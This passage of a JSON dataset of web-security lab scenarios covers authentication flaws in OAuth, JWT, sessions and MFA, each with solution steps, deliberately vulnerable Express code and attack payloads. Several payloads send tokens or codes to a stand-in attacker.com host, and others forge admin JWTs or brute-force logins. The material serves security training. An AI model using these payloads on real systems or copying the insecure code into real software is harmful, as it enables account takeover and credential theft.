    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback', (req, res) => {const code = req.query.code;res.send('<script src=\"https://attacker.com/steal?code='+code+'\"></script>');});app.listen(3000);",
    "payloads": [
      "<iframe src=\"https://victim.com/oauth?response_type=code&client_id=client&redirect_uri=https://attacker.com\"></iframe>",
      "<img src=\"https://attacker.com/log?ref=\"+document.referrer>",
      "<link rel=\"stylesheet\" href=\"https://attacker.com/steal?ref=\"+encodeURIComponent(document.referrer)>"
    ]
  },
  {
    "Lab scenario": "Session fixation via GraphQL websocket connection",
    "Lab Description": "The GraphQL subscription endpoint assigns sessions during websocket initialization without proper validation. The application reuses session IDs from connection parameters. To solve: fixate a victim's session by forcing them to connect with a predetermined session ID.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture websocket handshake with Burp Suite",
      "Note session parameter in connection URL",
      "Craft malicious page initiating subscription",
      "Induce victim to visit page",
      "Hijack authenticated session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const { createServer } = require('http');const { SubscriptionServer } = require('subscriptions-transport-ws');const app = express();const server = createServer(app);SubscriptionServer.create({onConnect: (params, socket) => {socket.session = socket.upgradeReq.url.split('session=')[1];}}, {server, path: '/graphql'});app.listen(3000);",
    "payloads": [
      "new WebSocket('ws://victim.com/graphql?session=attacker_sid')",
      "const ws = new WebSocket(`ws://victim.com/graphql?session=${document.cookie.match(/session=([^;]+)/)[1]}`)",
      "<script>const client = new SubscriptionClient('ws://victim.com/graphql?session=attacker_sid')</script>"
    ]
  },
  {
    "Lab scenario": "Password reset poisoning via X-Forwarded-Prefix",
    "Lab Description": "The password reset functionality trusts X-Forwarded-Prefix header for link generation without validation. The application constructs reset links using untrusted headers. To solve: poison the reset link to point to an attacker-controlled domain.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept password reset request with Burp Suite",
      "Add X-Forwarded-Prefix: https://attacker.com header",
      "Submit request and capture poisoned link",
      "Wait for victim to click link",
      "Use token to reset victim's password"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/reset', (req, res) => {const prefix = req.headers['x-forwarded-prefix'] || 'https://victim.com';const token = generateToken();res.send(`Reset link: ${prefix}/reset?token=${token}`);});app.listen(3000);",
    "payloads": [
      "POST /reset HTTP/1.1\nHost: victim.com\nX-Forwarded-Prefix: https://attacker.com",
      "GET /reset?token=stolen-token HTTP/1.1\nHost: attacker.com",
      "POST /reset HTTP/1.1\nX-Forwarded-Host: attacker.com\nX-Forwarded-Prefix: https://attacker.com"
    ]
  },
  {
    "Lab scenario": "JWT public key substitution via jku header",
    "Lab Description": "The JWT validation accepts arbitrary jku headers pointing to external public keys. The application doesn't verify the key server's authenticity. To solve: forge an admin token by hosting a malicious public key and referencing it in the jku header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture valid JWT with Burp Suite",
      "Generate RSA key pair using OpenSSL",
      "Host public key on attacker-controlled server",
      "Create token with jku pointing to malicious key",
      "Sign token with private key and submit"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, {complete:true});if(decoded.header.jku) {fetch(decoded.header.jku).then(key => {jwt.verify(token, key);});}if(decoded.payload.role==='admin') res.send('Admin access');} catch(e) {res.status(500).send(e.message);}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL3B1YmxpYy5rZXkifQ.eyJyb2xlIjoiYWRtaW4ifQ.fake-signature",
      "eyJhbGciOiJSUzI1NiIsImpydSI6Imh0dHA6Ly8xMjcuMC4wLjE6ODA4MC9tYWxpY2lvdXMua2V5In0.eyJhZG1pbiI6dHJ1ZX0.fake-signature",
      "eyJhbGciOiJSUzI1NiIsImprZSI6Imh0dHBzOi8vZXZpbC5jb20va2V5In0.eyJhY2Nlc3MiOiJhZG1pbiJ9.fake-signature"
    ]
  },
  {
    "Lab scenario": "JWT cnf claim injection in healthcare API",
    "Lab Description": "The JWT validation vulnerable to key confusion via cnf claim manipulation. The application processes cnf claims without proper verification of key ownership. To solve: forge admin token by injecting malicious cnf claim pointing to attacker-controlled public key.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT with Burp Suite and analyze cnf claim",
      "Generate RSA key pair using OpenSSL",
      "Craft JWT with cnf claim containing attacker's public key",
      "Sign token with matching private key",
      "Submit to privileged endpoint to access patient records"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/records', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, {complete:true});if(decoded.payload.cnf) {jwt.verify(token, decoded.payload.cnf.jwk);}if(decoded.payload.role==='admin') res.json({records: 'sensitive data'});} catch(e) {res.status(403).send('Access denied');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJjbWYiOnsianJrIjp7Imt0eSI6IlJTQSIsIm4iOiJhdHRhY2tlci1wdWJsaWMta2V5In19fQ.fake-signature",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwiY25mIjp7Imp3ayI6eyJrdHkiOiJSU0EiLCJuIjoibWFsbGljaW91cy1wdWJsaWMta2V5In19fQ.fake-signature",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3MiOiJhZG1pbiIsImNuZiI6eyJqd2siOnsia3R5IjoiUlNBIiwibiI6ImV2aWwtcHVibGljLWtleSJ9fX0.fake-signature"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via WebRTC in SPA",
    "Lab Description": "The OAuth implementation leaks access tokens through WebRTC ICE candidates. The application embeds tokens in STUN/TURN server credentials without proper sanitization. To solve: steal OAuth token by intercepting WebRTC negotiation messages.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze OAuth flow with OWASP ZAP to identify WebRTC usage",
      "Intercept WebRTC offer/answer exchange",
      "Extract access token from ICE candidate credentials",
      "Use token to query protected API endpoints",
      "Access user profile data to verify exploitation"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/video-chat', (req, res) => {const token = req.query.token;res.send(`<script>new RTCPeerConnection({iceServers:[{urls:'stun:stun.victim.com',credential:'${token}'}]})</script>`);});app.listen(3000);",
    "payloads": [
      "new RTCPeerConnection({iceServers:[{urls:'turn:attacker.com',credential:'stolen-token'}]})",
      "pc=new RTCPeerConnection();pc.onicecandidate=e=>{if(e.candidate)fetch('https://attacker.com/?token='+e.candidate.credential)}",
      "<iframe src=\"javascript:new RTCPeerConnection({iceServers:[{urls:'stun:stun.victim.com',credential:localStorage.getItem('token')}]})\"></iframe>"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/3 early data",
    "Lab Description": "The HTTP/3 server accepts session cookies in early data (0-RTT) without proper validation. The application reuses session IDs from previous connections. To solve: fixate victim's session by forcing 0-RTT request with predetermined session ID.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture HTTP/3 traffic with Burp Suite to analyze early data",
      "Note session cookie assignment during initial connection",
      "Craft malicious 0-RTT request with fixed session",
      "Induce victim to reconnect while maintaining session",
      "Hijack authenticated session through early data"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const spdy = require('spdy');const app = express();app.get('/', (req, res) => {if(req.earlyData) res.cookie('session', req.query.sid||generateId());res.send('Home page');});spdy.createServer({allowHTTP1:true,earlyData:true}, app).listen(3000);",
    "payloads": [
      "GET /?sid=attacker_sid HTTP/3\nHost: victim.com\nEarly-Data: 1",
      "GET /account HTTP/3\nHost: victim.com\nCookie: session=attacker_sid",
      "fetch('https://victim.com/',{method:'GET',headers:{'Early-Data':'1'},credentials:'include'})"
    ]
  },
  {
    "Lab scenario": "Password reset poisoning via X-Original-URL header",
    "Lab Description": "The password reset functionality trusts X-Original-URL header for link generation without validation. The application constructs reset links using untrusted headers. To solve: poison reset link to point to attacker-controlled domain.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept password reset request with Burp Suite",
      "Add X-Original-URL: https://attacker.com/reset header",
      "Submit request and capture poisoned link",
      "Wait for victim to click link",
      "Use token to reset victim's password"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/reset', (req, res) => {const url = req.headers['x-original-url'] || 'https://victim.com/reset';const token = generateToken();res.send(`Reset link: ${url}?token=${token}`);});app.listen(3000);",
    "payloads": [
      "POST /reset HTTP/1.1\nHost: victim.com\nX-Original-URL: https://attacker.com/reset",
      "GET /reset?token=stolen-token HTTP/1.1\nHost: attacker.com",
      "POST /reset HTTP/1.1\nX-Forwarded-Host: attacker.com\nX-Original-URL: https://attacker.com/reset"
    ]
  },
  {
    "Lab scenario": "JWT public key substitution via x5t#S256 header injection",
    "Lab Description": "The JWT validation accepts arbitrary x5t#S256 headers containing certificate thumbprints. The application doesn't verify certificate chain integrity. To solve: forge admin token by spoofing SHA-256 certificate thumbprint in x5t#S256 header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture valid JWT and note x5t#S256 header support",
      "Generate self-signed certificate using OpenSSL",
      "Calculate SHA-256 thumbprint of certificate",
      "Create JWT with x5t#S256 header matching thumbprint",
      "Sign token with private key and submit"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, {complete:true});if(decoded.header['x5t#S256']) {jwt.verify(token, {thumbprint:decoded.header['x5t#S256']});}if(decoded.payload.role==='admin') res.send('Admin access');} catch(e) {res.status(500).send(e.message);}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsIng1dCNTMjU2IjoiYXR0YWNrZXItdGh1bWJwcmludCJ9.eyJyb2xlIjoiYWRtaW4ifQ.fake-signature",
      "eyJhbGciOiJSUzI1NiIsIng1dCNTMjU2IjoibWFsbGljaW91cy10aHVtYnByaW50In0.eyJhZG1pbiI6dHJ1ZX0.fake-signature",
      "eyJhbGciOiJSUzI1NiIsIng1dCNTMjU2IjoiZXZpbC10aHVtYnByaW50In0.eyJhY2Nlc3MiOiJhZG1pbiJ9.fake-signature"
    ]
  },
  {
    "Lab scenario": "JWT alg:none bypass in REST API",
    "Lab Description": "The lab's authentication system uses JWTs with improper signature validation. The application accepts unsigned tokens when the alg header is set to 'none'. To solve: forge a valid JWT for admin user by exploiting signature verification flaws.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept login request with Burp Suite to capture a valid JWT",
      "Decode the JWT using jwt.io to analyze structure",
      "Modify the alg header to 'none' and change the role to 'admin'",
      "Remove the signature portion entirely (leave it empty)",
      "Submit the modified token in Authorization header to access admin panel"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization.split(' ')[1];const decoded = jwt.decode(token, {complete: true});if (decoded.header.alg === 'none') {const payload = decoded.payload;if (payload.user === 'admin') res.send('Admin dashboard');else res.status(403).send('Forbidden');} else {try {jwt.verify(token, 'secretkey');res.send('Valid token');} catch {res.status(401).send('Invalid token');}}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via open redirect",
    "Lab Description": "The OAuth implementation leaks authorization codes through unvalidated redirect URLs. The application fails to verify redirect_uri against whitelisted domains. To solve: steal an OAuth token by chaining an open redirect with the OAuth flow.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify OAuth initiation endpoint with Postman",
      "Craft malicious redirect_uri pointing to attacker domain",
      "Intercept authorization flow with OWASP ZAP",
      "Capture leaked code parameter in redirect",
      "Exchange code for access token at OAuth token endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/authorize', (req, res) => {const {client_id, redirect_uri, state} = req.query;if (client_id === 'legitapp') {const code = 'RANDOM_OAUTH_CODE';res.redirect(`${redirect_uri}?code=${code}&state=${state}`);} else {res.status(400).send('Invalid client');}});app.post('/oauth/token', (req, res) => {if (req.body.code === 'RANDOM_OAUTH_CODE') {res.json({access_token: 'SECRET_TOKEN'});} else {res.status(401).send('Invalid code');}});app.listen(3000);",
    "payloads": [
      "/oauth/authorize?client_id=legitapp&redirect_uri=https://attacker.com&response_type=code",
      "/oauth/authorize?client_id=legitapp&redirect_uri=http://localhost&response_type=token"
    ]
  },
  {
    "Lab scenario": "GraphQL batching attack on auth endpoint",
    "Lab Description": "The GraphQL API allows query batching that bypasses rate limiting on authentication attempts. The application processes batched queries sequentially without cumulative rate checks. To solve: brute-force credentials by sending 100 login attempts in a single batch request.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze GraphQL schema with introspection query",
      "Craft batch mutation containing multiple login attempts",
      "Use Postman to send JSON array of auth mutations",
      "Identify successful attempt by response differences",
      "Extract valid credentials from the matching response"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const {ApolloServer, gql} = require('apollo-server-express');const typeDefs = gql`type Mutation {login(username: String!, password: String!): String!}`;const resolvers = {Mutation: {login: (_, {username, password}) => {if (username === 'admin' && password === 'secret') return 'VALID_TOKEN';throw new Error('Invalid credentials');}}};const server = new ApolloServer({typeDefs, resolvers});const app = require('express')();server.applyMiddleware({app});app.listen(4000);",
    "payloads": [
      "[{\"query\":\"mutation {login(username:\\\"admin\\\", password:\\\"guess1\\\")}\"},{\"query\":\"mutation {login(username:\\\"admin\\\", password:\\\"guess2\\\")}\"}]",
      "[{\"query\":\"mutation($pass:String!){login(username:\\\"admin\\\",password:$pass)}\",\"variables\":{\"pass\":\"test\"}}]"
    ]
  },
  {
    "Lab scenario": "Session fixation via subdomain cookie scope",
    "Lab Description": "The application sets session cookies without proper domain restrictions, allowing fixation attacks across subdomains. The vulnerable component accepts pre-set session IDs from untrusted subdomains. To solve: fix a session cookie on a subdomain then trick the victim into authenticating with it.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify cookie-setting behavior with Burp Suite",
      "Craft malicious page on attacker.testdomain.com",
      "Set broad-scope session cookie via JavaScript",
      "Lure victim to attacker-controlled subdomain",
      "Capture authenticated session after victim login"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const cookieParser = require('cookie-parser');const app = express();app.use(cookieParser());app.get('/login', (req, res) => {if (!req.cookies.sessid) res.cookie('sessid', 'RANDOM_VALUE', {domain: '.testdomain.com'});if (req.query.user === 'admin') res.cookie('authenticated', 'true');res.send('Login page');});app.get('/admin', (req, res) => {if (req.cookies.authenticated === 'true') res.send('Sensitive data');else res.status(403).send('Access denied');});app.listen(3000);",
    "payloads": [
      "document.cookie=\"sessid=malicious;domain=.testdomain.com;path=/\"",
      "<iframe src=\"//attacker.testdomain.com/setcookie.html\"></iframe>"
    ]
  },
  {
    "Lab scenario": "MFA bypass via state parameter manipulation",
    "Lab Description": "The multi-factor authentication flow relies on client-side state validation. The application fails to verify server-side that the same device completes both authentication steps. To solve: initiate MFA on attacker device then complete on victim device by copying state parameters.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture initial auth request with OWASP ZAP",
      "Note state and nonce parameters in MFA initiation",
      "Inject parameters into victim's active session",
      "Bypass MFA by reusing valid state values",
      "Access account before token expiration"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const sessions = {};app.post('/mfa/initiate', (req, res) => {const state = Math.random().toString(36).substring(2);const nonce = Math.random().toString(36).substring(2);sessions[state] = {nonce, verified: false};res.json({state, nonce});});app.post('/mfa/verify', (req, res) => {const {state, nonce} = req.body;if (sessions[state] && sessions[state].nonce === nonce) {sessions[state].verified = true;res.json({success: true});} else {res.status(400).json({error: 'Invalid state'});}});app.get('/account', (req, res) => {if (sessions[req.query.state]?.verified) res.send('Account data');else res.status(403).send('MFA required');});app.listen(3000);",
    "payloads": [
      "{\"state\":\"stolen_state\",\"nonce\":\"stolen_nonce\"}",
      "/account?state=compromised_state_value"
    ]
  },
  {
    "Lab scenario": "JWT kid header path traversal in microservice auth",
    "Lab Description": "The JWT validation service improperly processes kid header values, allowing local file inclusion. The application blindly trusts the kid parameter to load verification keys. To solve: forge a valid admin token by forcing the system to use a predictable local file as the verification key.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept authentication flow with Burp Suite to capture JWT structure",
      "Modify kid header to point to /dev/null or known static file",
      "Craft token with HS256 algorithm and simple known-key signature",
      "Bypass verification using file path traversal in kid parameter",
      "Access admin API endpoint with forged token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const fs = require('fs');const app = express();const validateToken = (token) => {const header = jwt.decode(token, {complete: true}).header;const key = fs.readFileSync(header.kid || 'keys/default.pem');return jwt.verify(token, key);};app.get('/admin', (req, res) => {try {const user = validateToken(req.headers.authorization);if (user.role === 'admin') res.send('Sensitive data');else res.status(403).send('Forbidden');} catch {res.status(401).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9kZXYvbnVsbCJ9.eyJyb2xlIjoiYWRtaW4ifQ.dBj3d3g6JZX6X5jY7X5jY7X5jY7X5jY7X5jY7X5jY",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9ldGMvcGFzc3dkIn0.eyJyb2xlIjoiYWRtaW4ifQ.8X5jY7X5jY7X5jY7X5jY7X5jY7X5jY7X5jY7X5jY"
    ]
  },
  {
    "Lab scenario": "OAuth token swapping via state parameter injection",
    "Lab Description": "The OAuth implementation fails to properly bind state parameters to session contexts. The application accepts valid tokens with mismatched state values. To solve: intercept another user's OAuth flow and swap their authorization code into your session while maintaining your original state parameter.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate OAuth flow and capture state parameter with OWASP ZAP",
      "Intercept victim's authorization callback using proxy",
      "Modify callback to maintain original state but victim's code",
      "Complete OAuth flow with swapped credentials",
      "Access victim's resources through stolen token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const sessions = {};const oauthTokens = {};app.get('/oauth/callback', (req, res) => {const {code, state} = req.query;if (!sessions[state]) return res.status(400).send('Invalid state');oauthTokens[state] = code;res.redirect('/welcome?state='+state);});app.get('/exchange', (req, res) => {const token = oauthTokens[req.query.state];if (token) res.json({access_token: 'VALID_'+token});else res.status(401).send('Invalid code');});app.listen(3000);",
    "payloads": [
      "/oauth/callback?code=VICTIM_CODE&state=ATTACKER_STATE",
      "/exchange?state=ATTACKER_STATE"
    ]
  },
  {
    "Lab scenario": "Session prediction via JTI collision in JWT revocation",
    "Lab Description": "The JWT revocation system uses predictable jti claims that can be brute-forced. The application fails to properly randomize unique token identifiers. To solve: predict valid jti values for active sessions and bypass token revocation checks.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture multiple JWTs to analyze jti pattern with jwt.io",
      "Identify incremental jti generation pattern",
      "Use Burp Intruder to brute-force valid jti ranges",
      "Craft token with predicted jti of active admin session",
      "Bypass revocation check and access protected resources"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();let lastJti = 1000;const revoked = new Set();app.post('/login', (req, res) => {lastJti++;const token = jwt.sign({user:req.body.user,jti:lastJti},'secret');res.json({token});});app.get('/admin', (req, res) => {try {const decoded = jwt.verify(req.headers.authorization, 'secret');if (revoked.has(decoded.jti)) throw Error();if (decoded.user === 'admin') res.send('Admin data');else res.status(403).send('Forbidden');} catch {res.status(401).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJqdGkiOjEwNTV9.8X5jY7X5jY7X5jY7X5jY7X5jY7X5jY7X5jY7X5jY",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJqdGkiOjEwNTZ9.8X5jY7X5jY7X5jY7X5jY7X5jY7X5jY7X5jY7X5jY"
    ]
  },
  {
    "Lab scenario": "MFA bypass via race condition in verification state",
    "Lab Description": "The multi-factor authentication system has a race window between verification and session update. The application checks MFA status without proper synchronization. To solve: send parallel requests to exploit the time gap between verification and session marking.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate MFA flow and capture verification token with Burp",
      "Send 10 concurrent verification requests using Turbo Intruder",
      "Immediately request privileged endpoint during race window",
      "Identify successful bypass when session grants access",
      "Repeat until race condition is triggered"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const sessions = {};app.post('/verify-mfa', (req, res) => {if (req.body.code === '123456') {setTimeout(() => {sessions[req.body.sessionId].verified = true;}, 500);res.send('Verifying...');}});app.get('/transfer', (req, res) => {if (sessions[req.query.sessionId]?.verified) res.send('Funds transferred');else res.status(403).send('MFA required');});app.listen(3000);",
    "payloads": [
      "POST /verify-mfa HTTP/1.1\r\n\r\nsessionId=race1&code=123456",
      "GET /transfer?sessionId=race1 HTTP/1.1"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via HTTP verb tampering on auth endpoint",
    "Lab Description": "The authentication endpoint processes credentials differently based on HTTP methods. The application fails to properly validate credentials on HEAD requests while still returning valid session cookies. To solve: perform credential stuffing attacks using HEAD requests to bypass rate limiting.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify alternative HTTP methods accepted by auth endpoint with OPTIONS",
      "Capture successful login with POST to analyze cookie setting behavior",
      "Use Burp Intruder to send HEAD requests with credential list",
      "Filter responses for Set-Cookie headers indicating success",
      "Use stolen session cookies to access accounts"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const users = {'admin':'password123'};app.head('/login', (req, res) => {res.set('Set-Cookie', 'session=HEAD_BYPASS');res.end();});app.post('/login', (req, res) => {if (users[req.body.user] === req.body.pass) {res.cookie('session', 'VALID_SESSION');res.send('Logged in');} else {res.status(401).send('Invalid credentials');}});app.get('/admin', (req, res) => {if (req.cookies.session === 'VALID_SESSION') res.send('Admin panel');else res.status(403).send('Forbidden');});app.listen(3000);",
    "payloads": [
      "HEAD /login HTTP/1.1\r\n\r\nuser=admin&pass=password123",
      "HEAD /login HTTP/1.1\r\n\r\nuser=admin&pass=guess1"
    ]
  },
  {
    "Lab scenario": "JWT claim injection via nested JSON objects",
    "Lab Description": "The JWT parser incorrectly processes nested JSON objects in claims, allowing privilege escalation. The application fails to properly validate claim structures when performing authorization checks. To solve: inject nested role objects to bypass admin checks while maintaining valid signature.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture valid JWT using Burp Suite and analyze structure",
      "Modify payload to include nested role object: {\"role\":{\"name\":\"admin\"}}",
      "Maintain original signature while adding nested claims",
      "Submit modified token to admin API endpoints",
      "Verify access to restricted functionality"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization.split(' ')[1];const payload = jwt.verify(token, 'secret');if (payload.role?.name === 'admin') res.send('Admin data');else res.status(403).send('Forbidden');});app.post('/login', (req, res) => {const token = jwt.sign({user:req.body.user,role:'user'},'secret');res.json({token});});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsInJvbGUiOnsibmFtZSI6ImFkbWluIn19.8X5jY7X5jY7X5jY7X5jY7X5jY7X5jY7X5jY7X5jY",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjp7Im5hbWUiOiJhZG1pbiJ9fQ.8X5jY7X5jY7X5jY7X5jY7X5jY7X5jY7X5jY7X5jY"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via iframe CSP bypass",
    "Lab Description": "The OAuth implementation leaks tokens through insecure iframe communication that bypasses CSP protections. The application fails to properly validate message origins in postMessage handlers. To solve: craft malicious page that extracts tokens via iframe contentWindow communication.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify OAuth iframe endpoints using OWASP ZAP",
      "Create attacker page with malicious postMessage listener",
      "Embed OAuth iframe with allow-same-origin",
      "Exfiltrate tokens via cross-frame JavaScript calls",
      "Use stolen tokens to authenticate as victim"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/iframe', (req, res) => {res.set('Content-Security-Policy', \"default-src 'self'\");res.send(`<script>window.addEventListener('message',e=>{window.parent.postMessage({token:'SECRET_TOKEN'},'*')})</script>`);});app.listen(3000);",
    "payloads": [
      "<iframe src=\"https://vulnerable.com/oauth/iframe\" onload=\"this.contentWindow.postMessage('','*')\"></iframe>",
      "<script>window.addEventListener('message',e=>{fetch('https://attacker.com?token='+e.data.token)})</script>"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebSocket handshake",
    "Lab Description": "The application establishes sessions through WebSocket connections before authentication. The WebSocket handshake accepts attacker-provided session identifiers. To solve: fixate session ID during WS connection then authenticate to hijack the session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept WebSocket handshake with Burp Suite",
      "Inject custom Session-ID header during connection",
      "Complete authentication through normal HTTP flow",
      "Reuse WebSocket session in authenticated context",
      "Verify session persistence across protocols"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const WebSocket = require('ws');const app = express();const sessions = {};const wss = new WebSocket.Server({ noServer: true });wss.on('connection', (ws, req) => {const sessionId = req.headers['session-id'];ws.session = sessions[sessionId] || {};});app.post('/login', (req, res) => {const sessionId = Math.random().toString(36);sessions[sessionId] = { user: req.body.user };res.json({ sessionId });});const server = app.listen(3000);server.on('upgrade', (req, socket, head) => {wss.handleUpgrade(req, socket, head, (ws) => {wss.emit('connection', ws, req);});});",
    "payloads": [
      "GET /chat HTTP/1.1\r\nHost: vulnerable.com\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSession-ID: FIXATED_ID\r\n\r\n",
      "wss://vulnerable.com/chat -H \"Session-ID: FIXATED_ID\""
    ]
  },
  {
    "Lab scenario": "MFA bypass via time-limited backup code reuse",
    "Lab Description": "The multi-factor authentication system improperly validates backup codes, allowing unlimited reuse within the expiration window. The application fails to track used backup codes in real-time. To solve: intercept valid backup code and reuse it before server-side invalidation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture backup code during legitimate MFA flow using Burp",
      "Immediately reuse captured code in parallel session",
      "Bypass MFA before backend validation completes",
      "Maintain authenticated session after code expiration",
      "Access protected resources before session timeout"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const usedCodes = new Set();app.post('/verify-backup', (req, res) => {const { code } = req.body;setTimeout(() => usedCodes.add(code), 10000);if (code === '123456') res.json({ verified: true });else res.status(400).json({ error: 'Invalid code' });});app.listen(3000);",
    "payloads": [
      "{\"code\":\"123456\"}",
      "{\"code\":\"123456\",\"user\":\"admin\"}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via case-insensitive password comparison",
    "Lab Description": "The authentication system performs case-insensitive password comparison, reducing effective password entropy. The application converts all passwords to lowercase before comparison. To solve: perform credential stuffing with case variations of known passwords.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify case-insensitive behavior via error messages with Postman",
      "Load known password lists into Burp Intruder",
      "Configure payload processing to generate case variations",
      "Launch attack with all case permutations",
      "Identify successful authentication attempts"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const users = { 'admin': { password: 'Secret123' } };app.post('/login', (req, res) => {const user = users[req.body.user];if (user && user.password.toLowerCase() === req.body.pass.toLowerCase()) {res.send('Logged in');} else {res.status(401).send('Invalid credentials');}});app.listen(3000);",
    "payloads": [
      "{\"user\":\"admin\",\"pass\":\"SECRET123\"}",
      "{\"user\":\"admin\",\"pass\":\"secret123\"}"
    ]
  },
  {
    "Lab scenario": "JWT public key substitution via jwk header injection",
    "Lab Description": "The JWT validation endpoint improperly processes jwk header parameters, allowing attackers to specify their own verification keys. The application fails to validate the origin of supplied keys. To solve: forge a valid admin token by injecting a malicious jwk header with attacker-controlled public key.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture valid JWT using Burp Suite and analyze structure",
      "Generate RSA key pair using OpenSSL",
      "Craft token with jwk header containing public key",
      "Sign token with corresponding private key",
      "Submit forged token to admin API endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.post('/verify', (req, res) => {const token = req.body.token;const decoded = jwt.decode(token, {complete: true});const key = decoded.header.jwk ? jwt.verify(token, decoded.header.jwk) : jwt.verify(token, 'SECRET_KEY');if (key.role === 'admin') res.send('Admin access granted');else res.status(403).send('Forbidden');});app.listen(3000);",
    "payloads": [
